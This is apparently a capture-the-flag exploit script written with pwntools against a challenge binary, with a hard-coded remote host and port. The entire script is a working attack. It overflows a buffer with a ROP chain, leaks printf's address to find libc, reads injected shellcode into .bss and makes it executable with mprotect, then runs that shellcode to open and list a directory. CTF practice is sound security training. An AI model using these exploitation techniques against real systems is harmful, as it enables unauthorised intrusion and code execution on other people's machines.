#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from mmap import PROT_EXEC, PROT_READ, PROT_WRITE

from pwn import *

elf = context.binary = ELF("./chall_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc 3.75.185.198 10000"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

pop_rdi_rsi_rdx = 0x004014d9
ret = pop_rdi_rsi_rdx + 3
sc_addr = ((elf.bss() >> 8) + 2) << 8
log.info(f"{sc_addr=:#x}")

payload = b"A" * 0x20
payload += flat(
    elf.bss(0xc00),
    pop_rdi_rsi_rdx, elf.got["printf"], 0, 0,
    ret,
    elf.plt["printf"],
    pop_rdi_rsi_rdx, 0, sc_addr, 0x800,
    elf.plt["read"],
    elf.sym["main"] + 42
)
io.sendafter(b"Input: ", payload)
printf_leak = u64(io.recv(6) + b"\x00\x00")
libc.address = printf_leak - 0x606f0
log.info(f"{libc.address=:#x}")

time.sleep(0.1)
sc = ""
path_cwd = b"/proc/self/cwd"
for i in range(0, len(path_cwd), 8):
    sc = f"mov rax, 0x{path_cwd[i:i+8][::-1].hex()}\npush rax\n" + sc

sc += """
mov rdi, rsp
xor esi, esi
xor edx, edx
push 0x2
pop rax
syscall

mov r15, rax

mov rdi, r15
push 0x4e
pop rax
syscall
"""

print(sc)

pause()
io.send(b"\x90" * 8)

payload = b"A" * 0x20
payload += flat(elf.bss(0xc00),
                pop_rdi_rsi_rdx,
                elf.bss() >> 12 << 12,
                0x1000,
                PROT_READ | PROT_WRITE | PROT_EXEC,
                libc.sym["mprotect"],
                sc_addr)

pause()
io.send(payload)

io.interactive()
